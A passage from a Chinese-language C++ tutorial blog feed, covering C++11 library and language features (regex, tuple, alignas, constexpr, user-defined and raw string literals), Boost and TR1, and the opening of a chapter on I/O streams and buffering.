&quot;</span> &lt;&lt; distrib(gen) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 生成随机数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong><code>&lt;regex&gt;</code>:</strong> 提供了对<strong>正则表达式 (Regular Expressions)</strong> 的支持，用于强大的文本模式匹配和搜索/替换。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Email: example@test.com&quot;</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::regex <span class="title">email_regex</span><span class="params">(<span class="string">R&quot;(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b)&quot;</span>)</span></span>; <span class="comment">// 原始字符串字面量</span></span><br><span class="line">    <span class="built_in">std</span>::smatch match;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::regex_search(text, match, email_regex)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found email: &quot;</span> &lt;&lt; match.str(<span class="number">0</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong><code>&lt;tuple&gt;</code>:</strong> 提供了<strong>元组 (Tuple)</strong> 类型 <code>std::tuple</code>，可以看作是匿名的、固定大小的异构值集合，类似于 <code>std::pair</code> 的泛化。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tuple&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::tuple&lt;int, std::string, double&gt; t1(10, &quot;hello&quot;, 3.14);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tuple element 0: &quot;</span> &lt;&lt; <span class="built_in">std</span>::get&lt;<span class="number">0</span>&gt;(t1) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 std::get&lt;i&gt; 访问</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tuple element 1: &quot;</span> &lt;&lt; <span class="built_in">std</span>::get&lt;<span class="number">1</span>&gt;(t1) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// C++17 结构化绑定更方便: auto [id, name, value] = t1;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="18-7-3-低级编程"><a href="#18-7-3-低级编程" class="headerlink" title="18.7.3 低级编程"></a>18.7.3 低级编程</h3><p>C++11 也增强了对底层内存布局和编译时计算的支持：</p><ul><li><strong>对齐控制 (<code>alignas</code>, <code>alignof</code>):</strong><ul><li>  <code>alignas</code>: 用于指定变量或类型的<strong>内存对齐要求</strong>。</li><li><code>alignof</code>: 用于查询类型或对象的对齐要求（返回一个 <code>size_t</code>）。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">struct <span class="title">alignas</span><span class="params">(<span class="number">16</span>)</span> AlignedStruct </span>&#123; <span class="comment">// 要求按 16 字节对齐</span></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">32</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Alignment of int: &quot;</span> &lt;&lt; <span class="keyword">alignof</span>(<span class="keyword">int</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Alignment of AlignedStruct: &quot;</span> &lt;&lt; <span class="keyword">alignof</span>(AlignedStruct) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong><code>constexpr</code>:</strong> 用于声明函数或变量可以在<strong>编译时</strong>求值。<code>constexpr</code> 函数可以在编译时用于常量表达式，也可以在运行时像普通函数一样使用。<code>constexpr</code> 变量必须用常量表达式初始化。这使得更多的计算可以在编译阶段完成，提高了运行时性能并增强了元编程能力。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// constexpr 函数，可在编译时计算</span></span><br><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n &lt;= <span class="number">1</span>) ? <span class="number">1</span> : (n * factorial(n - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">int</span> five_factorial = factorial(<span class="number">5</span>); <span class="comment">// 编译时计算结果为 120</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, factorial(4)&gt; arr; <span class="comment">// 数组大小在编译时确定为 24</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> runtime_val = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> six_factorial = factorial(runtime_val); <span class="comment">// 运行时计算</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="18-7-4-杂项"><a href="#18-7-4-杂项" class="headerlink" title="18.7.4 杂项"></a>18.7.4 杂项</h3><ul><li><strong>用户定义字面量 (User-defined Literals):</strong> 允许程序员为字面量（如 <code>&quot;hello&quot;</code>, <code>123</code>, <code>3.14</code>）定义后缀，从而创建具有特定类型或意义的对象。后缀通常以下划线 <code>_</code> 开头。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个将秒转换为毫秒的用户定义字面量后缀 _ms</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="built_in">std</span>::chrono::milliseconds <span class="keyword">operator</span><span class="string">&quot;&quot;</span> _ms(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ms) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::chrono::milliseconds(ms);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> duration = <span class="number">150</span>_ms; <span class="comment">// duration 的类型是 std::chrono::milliseconds，值为 150ms</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Duration: &quot;</span> &lt;&lt; duration.count() &lt;&lt; <span class="string">&quot;ms\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>原始字符串字面量 (Raw String Literals):</strong> 用于简化包含大量特殊字符（如反斜杠 <code>\</code>、引号 <code>&quot;</code>）的字符串的定义，避免了繁琐的转义。<ul><li>  语法：<code>R&quot;delimiter(raw_characters)delimiter&quot;</code></li><li><code>delimiter</code> 是可选的分隔符序列（不能包含括号、反斜杠或空格），用于区分字符串内容和结束标记。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 无需转义反斜杠和引号</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path = <span class="string">R&quot;(C:\Program Files\My App\data.txt)&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> html = <span class="string">R&quot;delimiter(</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;&lt;title&gt;&quot;Example&quot;&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;Hello, world!&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">)delimiter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; path &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; html &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>这些只是 C++11 新增功能的一部分，它们共同构成了现代 C++ 的基础，使得 C++ 成为一门功能更强大、表达力更强、更易于使用的编程语言。</p><h2 id="18-8-语言变化"><a href="#18-8-语言变化" class="headerlink" title="18.8 语言变化"></a>18.8 语言变化</h2><p>C++ 是一门不断发展的语言。从 C++98/03 到 C++11，再到后续的 C++14, C++17, C++20 等标准，语言本身和标准库都在持续演进，以满足现代软件开发的需求。C++11 是一个里程碑式的版本，引入了大量重要特性，其中许多特性并非凭空出现，而是在标准化之前经过了社区的广泛讨论和实践检验。Boost 库和 TR1 在这一过程中扮演了重要角色。</p><h3 id="18-8-1-Boost-项目"><a href="#18-8-1-Boost-项目" class="headerlink" title="18.8.1 Boost 项目"></a>18.8.1 Boost 项目</h3><p><strong>Boost C++ 库 (Boost C++ Libraries)</strong> 是一个广受推崇的、高质量的、经过同行评审的 C++ 库集合。它由 C++ 社区的众多开发者共同维护和贡献。</p><ul><li>  <strong>目的:</strong> Boost 旨在提供各种通用和特定领域的库，扩展 C++ 标准库的功能。它既包含可以直接使用的工具（如日期时间处理、文件系统操作、正则表达式、测试框架等），也包含一些实验性的、可能在未来被纳入 C++ 标准的库。</li><li>  <strong>影响力:</strong> Boost 对 C++ 标准的发展产生了深远影响。许多 C++11 及后续标准中的新特性（如智能指针 <code>shared_ptr</code>、函数包装器 <code>function</code>、线程库、正则表达式库、元组 <code>tuple</code>、<code>array</code> 等）都起源于 Boost 库中的对应组件，并在 Boost 中得到了广泛的应用和验证。</li><li>  <strong>“试炼场”:</strong> Boost 常常被视为 C++ 新特性的“试炼场”。一个库如果在 Boost 中被证明是稳定、有用且设计良好的，那么它被 C++ 标准委员会考虑并最终纳入官方标准的可能性就会大大增加。</li><li>  <strong>许可证:</strong> Boost 库通常采用非常宽松的 Boost Software License，允许在商业和非商业项目中自由使用。</li></ul><p>即使某些功能已被纳入 C++ 标准库，Boost 仍然提供了标准库中尚未包含的许多有用工具，并且有时会提供比标准库版本更早或功能更丰富的实现。</p><h3 id="18-8-2-TR1-Technical-Report-1"><a href="#18-8-2-TR1-Technical-Report-1" class="headerlink" title="18.8.2 TR1 (Technical Report 1)"></a>18.8.2 TR1 (Technical Report 1)</h3><p>**TR1 (Technical Report 1)**，正式名称是 ISO/IEC TR 19768:2007，是 C++ 标准委员会发布的一份技术报告，旨在扩展 C++03 标准库。它并不是 C++ 标准本身的一部分，但它定义了一系列推荐添加的库组件。</p><ul><li><strong>内容:</strong> TR1 包含了许多后来被正式纳入 C++11 标准库的特性，其中大部分源自 Boost 库。主要内容包括：<ul><li>  引用包装器 (<code>ref</code>, <code>cref</code>)</li><li>  智能指针 (<code>shared_ptr</code>, <code>weak_ptr</code> - <code>unique_ptr</code> 是 C++11 新设计的)</li><li>  函数对象包装器 (<code>function</code>)</li><li>  函数对象绑定器 (<code>bind</code>)</li><li>  类型萃取 (<code>&lt;type_traits&gt;</code>)</li><li>  随机数生成 (<code>&lt;random&gt;</code>)</li><li>  元组 (<code>&lt;tuple&gt;</code>)</li><li>  固定大小数组 (<code>&lt;array&gt;</code>)</li><li>  哈希表容器 (<code>&lt;unordered_set&gt;</code>, <code>&lt;unordered_map&gt;</code>)</li><li>  正则表达式 (<code>&lt;regex&gt;</code>)</li></ul></li><li>  <strong>命名空间:</strong> TR1 中的组件通常被放置在 <code>std::tr1</code> 命名空间下。例如，TR1 的智能指针是 <code>std::tr1::shared_ptr</code>。</li><li>  <strong>过渡角色:</strong> TR1 起到了一个重要的过渡作用。它允许编译器厂商和库开发者在 C++11 标准正式发布之前，就开始实现和提供这些即将标准化的重要库功能，让用户可以提前体验和使用。当 C++11 标准发布后，这些组件被正式移入了 <code>std</code> 命名空间，<code>std::tr1</code> 命名空间则逐渐被废弃。</li></ul><p>了解 Boost 和 TR1 有助于理解 C++11 中许多库特性的来源和演变过程。它们展示了 C++ 社区驱动语言发展的模式：通过第三方库（如 Boost）进行探索和实践，通过技术报告（如 TR1）进行预标准化，最终将成熟的特性纳入官方标准。</p><h3 id="18-8-3-使用-Boost"><a href="#18-8-3-使用-Boost" class="headerlink" title="18.8.3 使用 Boost"></a>18.8.3 使用 Boost</h3><p>虽然许多 Boost 库的功能已被 C++11 及后续标准吸收，但 Boost 仍然是一个非常有价值的资源库。</p><p><strong>如何使用 Boost (概念性步骤):</strong></p><ol><li> <strong>下载:</strong> 从 Boost 官方网站 (<a href="https://www.boost.org/">boost.org</a>) 下载最新的 Boost 发行版。</li><li> <strong>解压:</strong> 将下载的压缩包解压到你选择的目录。</li><li><strong>编译 (部分库需要):</strong> Boost 中的许多库是<strong>仅头文件 (Header-only)</strong> 的，这意味着你只需要在你的代码中 <code>#include</code> 相应的头文件，并将 Boost 的根目录添加到编译器的包含路径 (Include Path) 中即可使用。然而，也有一些库（如 Boost.Thread, Boost.Filesystem, Boost.Regex, Boost.Program_options 等）需要<strong>编译</strong>成静态库或动态库文件。<ul><li>  编译通常需要运行 Boost 提供的 <code>bootstrap</code> 脚本（根据你的操作系统选择 <code>.bat</code> 或 <code>.sh</code>），然后运行生成的 <code>b2</code> (或 <code>bjam</code>) 构建工具。你需要指定你的编译器、构建类型（debug/release）、链接方式（static/shared）等。具体步骤请参考 Boost 官方文档。</li></ul></li><li><strong>配置项目:</strong><ul><li>  <strong>包含路径:</strong> 在你的项目设置中，将 Boost 库的根目录添加到编译器的头文件搜索路径。</li><li>  <strong>库路径 (如果编译了库):</strong> 将生成的库文件所在的目录添加到链接器的库文件搜索路径。</li><li>  <strong>链接库 (如果编译了库):</strong> 将你需要使用的 Boost 库文件（如 <code>libboost_thread-vc142-mt-gd-x64-1_79.lib</code> 等，文件名会根据版本、编译器、配置等变化）添加到链接器的输入中。</li></ul></li><li> <strong>包含头文件:</strong> 在你的 C++ 代码中使用 <code>#include &lt;boost/xxx.hpp&gt;</code> 来包含所需的 Boost 头文件。</li></ol><p><strong>示例 (使用 Boost.Lexical_Cast):</strong><br>Boost.Lexical_Cast 是一个仅头文件的库，用于字符串和数值之间的转换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 Boost 根目录已添加到包含路径</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;boost/lexical_cast.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> s = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> i = boost::lexical_cast&lt;<span class="keyword">int</span>&gt;(s);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String &#x27;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;&#x27; cast to int: &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> d = <span class="number">3.14159</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> sd = boost::lexical_cast&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(d);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Double &quot;</span> &lt;&lt; d &lt;&lt; <span class="string">&quot; cast to string: &#x27;&quot;</span> &lt;&lt; sd &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> bad_s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> bad_i = boost::lexical_cast&lt;<span class="keyword">int</span>&gt;(bad_s); <span class="comment">// 会抛出 boost::bad_lexical_cast 异常</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> boost::bad_lexical_cast&amp; e) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Lexical cast error: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 Boost 库可以极大地扩展 C++ 的能力，但需要注意正确配置编译和链接环境。建议详细阅读你所使用的具体 Boost 库的文档。</p><h2 id="18-9-总结"><a href="#18-9-总结" class="headerlink" title="18.9 总结"></a>18.9 总结</h2><p>本章深入探讨了 C++11 标准引入的一系列重要特性，这些特性极大地改变了 C++ 的编程方式，使其更高效、更安全、更易用。</p><p>主要内容回顾：</p><ol><li><p> <strong>C++11 特性回顾:</strong> 复习了之前章节已介绍的 C++11 功能，包括新类型 (<code>long long</code>, <code>char16_t</code>, <code>char32_t</code>, <code>nullptr</code>)、统一初始化 (<code>&#123;&#125;</code>), 声明 (<code>auto</code>, <code>decltype</code>)、智能指针 (<code>unique_ptr</code>, <code>shared_ptr</code>, <code>weak_ptr</code>)、异常规范 (<code>noexcept</code>)、作用域内枚举 (<code>enum class</code>) 以及对类、模板和 STL 的改进（如范围 <code>for</code>、<code>array</code>、无序容器、<code>initializer_list</code>、模板别名 <code>using</code>）。</p></li><li><p><strong>移动语义和右值引用:</strong></p><ul><li>  <strong>右值引用 (<code>&amp;&amp;</code>):</strong> 引入用于区分即将销毁的临时对象（右值）和持久对象（左值）。</li><li>  <strong>移动语义:</strong> 允许从右值或标记为可移动的对象那里“窃取”资源（如动态内存指针），而不是进行昂贵的复制。</li><li>  <strong>移动构造函数和移动赋值运算符:</strong> 特殊成员函数，接收右值引用参数，实现资源转移并将源对象置于有效的空状态。应标记为 <code>noexcept</code>。</li><li>  <strong><code>std::move</code>:</strong> 将一个左值强制转换为右值引用类型，以触发移动语义（但本身不执行移动）。使用后不应对源对象的值做假设。</li></ul></li><li><p><strong>新的类功能:</strong></p><ul><li>  <strong>特殊成员函数控制 (<code>= default</code>, <code>= delete</code>):</strong> 显式要求编译器生成默认实现或禁用特定成员函数（特别是复制/移动操作）。</li><li>  <strong>委托构造函数:</strong> 允许一个构造函数调用同一类的另一个构造函数，减少代码重复。</li><li>  <strong>继承构造函数 (<code>using Base::Base;</code>):</strong> 允许派生类继承基类的构造函数，简化派生类编写。</li><li>  <strong>虚函数管理 (<code>override</code>, <code>final</code>):</strong> <code>override</code> 确保派生类方法正确覆盖基类虚函数；<code>final</code> 阻止虚函数被进一步覆盖或类被继承。</li></ul></li><li><p><strong>Lambda 函数:</strong></p><ul><li>  提供简洁的语法，用于在需要可调用对象的地方<strong>就地定义匿名函数对象</strong>。</li><li>  <strong><code>[capture](params) -&gt; ret &#123;body&#125;</code>:</strong> 包含捕获子句、参数列表（可选）、返回类型（可选）和函数体。</li><li>  <strong>捕获:</strong> 可以通过值 (<code>=</code>, <code>var</code>) 或引用 (<code>&amp;</code>, <code>&amp;var</code>) 捕获外部作用域的变量。<code>mutable</code> 关键字允许修改值捕获变量的副本。</li><li>  常用于 STL 算法，提高代码的局部性和可读性。</li></ul></li><li><p><strong>包装器 (<code>std::function</code>):</strong></p><ul><li>  定义在 <code>&lt;functional&gt;</code> 中的通用函数包装器。</li><li>  可以存储、复制和调用任何具有兼容签名的可调用实体（函数指针、Lambda、函数对象、成员函数等）。</li><li>  通过类型擦除实现，提供了灵活性，但在性能敏感场景下可能有开销（堆分配、间接调用）。</li><li>  替代方案包括模板（编译时已知类型时更高效）、函数指针、直接传递 Lambda。</li></ul></li><li><p><strong>可变参数模板:</strong></p><ul><li>  允许函数模板和类模板接受<strong>任意数量、任意类型</strong>的模板参数（模板参数包 <code>typename... Args</code>）和函数参数（函数参数包 <code>Args... args</code>）。</li><li>  使用 <code>sizeof...(Args)</code> 获取参数数量。</li><li>  通常需要通过<strong>递归</strong>或 C++17 的折叠表达式来<strong>展开</strong>参数包，以处理每个参数。</li></ul></li><li><p><strong>C++11 新增的其他功能:</strong></p><ul><li>  <strong>并发编程:</strong> 标准库支持 (<code>&lt;thread&gt;</code>, <code>&lt;mutex&gt;</code>, <code>&lt;atomic&gt;</code>, <code>&lt;future&gt;</code> 等）。</li><li>  <strong>新库:</strong> <code>&lt;chrono&gt;</code> (时间), <code>&lt;random&gt;</code> (随机数), <code>&lt;regex&gt;</code> (正则表达式), <code>&lt;tuple&gt;</code> (元组)。</li><li>  <strong>低级编程:</strong> 对齐控制 (<code>alignas</code>, <code>alignof</code>), 编译时计算 (<code>constexpr</code>)。</li><li>  <strong>杂项:</strong> 用户定义字面量, 原始字符串字面量 (<code>R&quot;(...)&quot;</code>)。</li></ul></li><li><p><strong>语言变化:</strong></p><ul><li>  强调了 C++ 语言的持续演进。</li><li>  介绍了 <strong>Boost 库</strong>作为 C++ 新特性的试验场和重要补充。</li><li>  介绍了 <strong>TR1</strong> 作为 C++11 库特性的前身和过渡。</li></ul></li></ol><p>C++11 是 C++ 发展的一个重要分水岭，它引入的这些特性深刻地影响了现代 C++ 的编程风格和实践。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 17 输入、输出和文件</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_17/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_17/</url>
      
        <content type="html"><![CDATA[<h2 id="17-1-C-输入和输出概述"><a href="#17-1-C-输入和输出概述" class="headerlink" title="17.1 C++输入和输出概述"></a>17.1 C++输入和输出概述</h2><p>C++ 程序经常需要与外部世界进行交互：从键盘读取用户输入，将结果显示到屏幕，或者读写文件。C++ 使用<strong>流 (Stream)</strong> 的概念来处理输入和输出 (I/O) 操作。</p><h3 id="17-1-1-流和缓冲区"><a href="#17-1-1-流和缓冲区" class="headerlink" title="17.1.1 流和缓冲区"></a>17.1.1 流和缓冲区</h3><p><strong>流 (Stream)</strong> 是一个抽象的概念，它表示一个字节序列，这些字节可以从某个源（如键盘、文件、网络连接）流向程序（输入流），或者从程序流向某个目的地（如屏幕、文件、网络连接）（输出流）。将 I/O 操作视为字节流可以提供一个统一的接口来处理各种不同的 I/O 设备。</p><p><strong>缓冲区 (Buffer)</strong> 是一块内存区域，用于临时存储数据。I/O 操作通常涉及物理设备（如硬盘、屏幕），这些设备的速度往往比 CPU 和内存慢得多。为了提高效率，数据通常不会在程序和设备之间逐个字节地传输，而是先暂存在缓冲区中：</p><ul><li>  <strong>输出:</strong> 当程序执行输出操作时（例如使用 <code>cout &lt;&lt;</code>），数据通常先被发送到输出缓冲区。当缓冲区满了、遇到换行符（对于行缓冲的流）、程序结束或显式刷新缓冲区时，缓冲区中的内容才会被一次性地传输到最终的输出设备。</li><li>  <strong>输入:</strong> 当程序请求输入时（例如使用 <code>cin &gt;&gt;</code>），系统可能会一次性从输入设备读取比程序请求的更多的数据，并将其存储在输入缓冲区中。程序随后从缓冲区中获取所需的数据。如果缓冲区为空，程序会等待输入设备提供数据。</li></ul><p><strong>使用缓冲区的好处:</strong></p><ul><li>  <strong>提高效率:</strong> 减少了与慢速 I/O 设备的直接交互次数。</li><li>  <strong>平滑数据流:</strong> 允许程序和设备以各自的速度工作。</li></ul><p><strong>缓冲区的类型:</strong></p><ul><li>  <strong>完全缓冲 (Fully Buffered):</strong> 只有当缓冲区满了，或者显式刷新时，才会进行实际的 I/O 操作（通常用于文件 I/O）。</li><li>  <strong>行缓冲 (Line Buffered):</strong> 除了缓冲区满或显式刷新外，遇到换行符 (<code>\n</code>) 时也会进行 I/O 操作（通常用于标准输出 <code>cout</code>，当它连接到终端时）。</li><li>  <strong>无缓冲 (Unbuffered):</strong> 数据尽快进行实际的 I/O 操作（通常用于标准错误输出 <code>cerr</code>，以确保错误信息能立即显示）。</li></ul><h3 id="17-1-2-流、缓冲区和-iostream-文件"><a href="#17-1-2-流、缓冲区和-iostream-文件" class="headerlink" 